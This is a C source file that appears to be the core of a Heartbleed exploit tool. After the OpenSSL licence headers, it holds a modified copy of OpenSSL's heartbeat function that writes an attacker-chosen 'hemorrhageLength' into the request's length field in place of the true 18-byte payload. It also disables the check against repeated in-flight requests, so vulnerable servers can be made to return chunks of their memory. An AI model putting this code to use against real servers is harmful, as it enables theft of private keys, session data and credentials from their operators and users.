/* Copyright (C) 1995-1998 Eric Young (eay@cryptsoft.com)
 * All rights reserved.
 *
 * This package is an SSL implementation written
 * by Eric Young (eay@cryptsoft.com).
 * The implementation was written so as to conform with Netscapes SSL.
 * 
 * This library is free for commercial and non-commercial use as long as
 * the following conditions are aheared to.  The following conditions
 * apply to all code found in this distribution, be it the RC4, RSA,
 * lhash, DES, etc., code; not just the SSL code.  The SSL documentation
 * included with this distribution is covered by the same copyright terms
 * except that the holder is Tim Hudson (tjh@cryptsoft.com).
 * 
 * Copyright remains Eric Young's, and as such any Copyright notices in
 * the code are not to be removed.
 * If this package is used in a product, Eric Young should be given attribution
 * as the author of the parts of the library used.
 * This can be in the form of a textual message at program startup or
 * in documentation (online or textual) provided with the package.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *    "This product includes cryptographic software written by
 *     Eric Young (eay@cryptsoft.com)"
 *    The word 'cryptographic' can be left out if the rouines from the library
 *    being used are not cryptographic related :-).
 * 4. If you include any Windows specific code (or a derivative thereof) from 
 *    the apps directory (application code) you must include an acknowledgement:
 *    "This product includes software written by Tim Hudson (tjh@cryptsoft.com)"
 * 
 * THIS SOFTWARE IS PROVIDED BY ERIC YOUNG ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 * 
 * The licence and distribution terms for any publically available version or
 * derivative of this code cannot be changed.  i.e. this code cannot simply be
 * copied and put under another distribution licence
 * [including the GNU Public Licence.]
 */
/* ====================================================================
 * Copyright (c) 1998-2007 The OpenSSL Project.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer. 
 *
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the documentation and/or other materials provided with the
 *    distribution.
 *
 * 3. All advertising materials mentioning features or use of this
 *    software must display the following acknowledgment:
 *    "This product includes software developed by the OpenSSL Project
 *    for use in the OpenSSL Toolkit. (http://www.openssl.org/)"
 *
 * 4. The names "OpenSSL Toolkit" and "OpenSSL Project" must not be used to
 *    endorse or promote products derived from this software without
 *    prior written permission. For written permission, please contact
 *    openssl-core@openssl.org.
 *
 * 5. Products derived from this software may not be called "OpenSSL"
 *    nor may "OpenSSL" appear in their names without prior written
 *    permission of the OpenSSL Project.
 *
 * 6. Redistributions of any form whatsoever must retain the following
 *    acknowledgment:
 *    "This product includes software developed by the OpenSSL Project
 *    for use in the OpenSSL Toolkit (http://www.openssl.org/)"
 *
 * THIS SOFTWARE IS PROVIDED BY THE OpenSSL PROJECT ``AS IS'' AND ANY
 * EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
 * PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE OpenSSL PROJECT OR
 * ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 * ====================================================================
 *
 * This product includes cryptographic software written by Eric Young
 * (eay@cryptsoft.com).  This product includes software written by Tim
 * Hudson (tjh@cryptsoft.com).
 *
 */

#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>

/* Taken from openssl/ssl/ssl_locl.h */

#define s2n(s,c)  ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
        c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

int ssl3_write_bytes(SSL *s, int type, const void *buf, int len);

/* Taken from openssl/ssl/t1_lib.c */

int
tls1_heartbeat_custom(SSL *s, unsigned int hemorrhageLength)
  {
  unsigned char *buf, *p;
  int ret;
  unsigned int payload = 18; /* Sequence number + random bytes */
  unsigned int padding = 16; /* Use minimum padding */

  /* Only send if peer supports and accepts HB requests... */
  if (!(s->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED) ||
      s->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS)
    {
    SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_TLS_HEARTBEAT_PEER_DOESNT_ACCEPT);
    return -1;
    }

  /* ...and there is none in flight yet... */
/*
  if (s->tlsext_hb_pending)
    {
    SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_TLS_HEARTBEAT_PENDING);
    return -1;
    }
*/
 
  /* ...and no handshake in progress. */
  if (SSL_in_init(s) || s->in_handshake)
    {
    SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_UNEXPECTED_MESSAGE);
    return -1;
    }
 
  /* Check if padding is too long, payload and padding
   * must not exceed 2^14 - 3 = 16381 bytes in total.
   */
  OPENSSL_assert(payload + padding <= 16381);

  /* Create HeartBeat message, we just use a sequence number
   * as payload to distuingish different messages and add
   * some random stuff.
   *  - Message Type, 1 byte
   *  - Payload Length, 2 bytes (unsigned int)
   *  - Payload, the sequence number (2 bytes uint)
   *  - Payload, random bytes (16 bytes uint)
   *  - Padding
   */
  buf = OPENSSL_malloc(1 + 2 + payload + padding);
  p = buf;
  /* Message Type */
  *p++ = TLS1_HB_REQUEST;
  /* Payload length (18 bytes here) */
/*  s2n(payload, p); */
  s2n(hemorrhageLength, p);
  /* Sequence number */
  s2n(s->tlsext_hb_seq, p);
  /* 16 random bytes */
  RAND_pseudo_bytes(p, 16);
  p += 16;
  /* Random padding */
  RAND_pseudo_bytes(p, padding);

  ret = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buf, 3 + payload + padding);
  if (ret >= 0)
    {
    if (s->msg_callback)
      s->msg_callback(1, s->version, TLS1_RT_HEARTBEAT,
        buf, 3 + payload + padding,
        s, s->msg_callback_arg);

    s->tlsext_hb_pending = 1;
    }

  OPENSSL_free(buf);

  return ret;
  }
